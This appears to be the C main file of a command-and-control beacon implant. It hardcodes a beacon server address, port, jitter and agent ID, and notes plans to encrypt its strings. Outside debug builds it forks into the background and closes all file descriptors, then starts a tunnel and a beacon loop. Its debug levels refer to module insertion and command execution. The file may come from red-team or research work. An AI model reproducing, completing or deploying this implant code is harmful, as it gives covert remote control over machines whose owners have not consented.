#include "common.h"
#include "beacon.h"
#include <pthread.h>
#include "tunnel.h"

#ifdef DEBUG
// 9 for module manager
// 8 for exec
// 7 for beaconAPI
// 6 for module insert
// 5 for beacon
// 4 for packet transport
// 3 for packet handle
// 2 for command execute
// 0 for error
int dbug_level_ = 9;
#endif

// TODO:
// string encrypt
struct cl_args args = {/*Domain name or IP address of beacon server*/ {'1', '2', '7', '.', '0', '.', '0', '.' , '1' , 0},
                       /*port*/ 2333,
                       /*interval*/ 1,
                       /*initDelay*/ 1,
                       /*jitter*/ 75,
                       /*agentID*/9527};

int main(int argc,char **argv,char **env)
{
    BEACONINFO beaconInfo = {.packets_mutex = PTHREAD_MUTEX_INITIALIZER,};

    #ifndef DEBUG
    int pid = fork();
    
    if(pid < 0) return -1;

    if(pid != 0){//parent
        return 0;
    }

    //child
    for(int i = 0;i<1024;i++){
        close(i);
    }
    #endif

    //init tunnel
    tunnel_init();

    beaconInfo.host = args.beacon_ip;
    beaconInfo.port = args.port;
    beaconInfo.interval = args.interval;
    beaconInfo.initDelay = args.initDelay;
    beaconInfo.jitter = args.jitter;
    beaconInfo.agentID = args.agentID;
    beaconInfo.argc = argc;
    beaconInfo.argv = argv;
    beaconInfo.env  = env;

    beacon(&beaconInfo);

    return 0;
}